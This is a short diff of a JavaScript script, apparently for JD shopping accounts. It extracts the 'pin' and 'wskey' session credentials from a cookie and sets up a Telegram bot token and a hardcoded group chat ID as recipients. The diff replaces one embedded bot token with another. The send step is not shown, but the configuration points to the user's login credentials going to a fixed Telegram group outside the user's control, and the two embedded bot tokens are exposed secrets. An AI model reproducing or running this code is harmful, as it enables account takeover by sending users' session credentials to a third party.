@@ -30,7 +30,7 @@ const pin = CK.match(/pin=([^=;]+?);/)[1];
 const key = CK.match(/wskey=([^=;]+?);/)[1];
 const _TGUserID = $.getData('id77_TGUserID');
 
-$.TGBotToken = '1790155133:AAGquY_LT8QKfQ4RldaZyZbBqTRaFXpHS9g';
+$.TGBotToken = '1946161121:AAG8Xp-oYELR15fXxxtnYS_cp-bw2kbsiU8';
 $.TGUserIDs = [-1001241545347];
 if (_TGUserID) {
   $.TGUserIDs.push(_TGUserID);
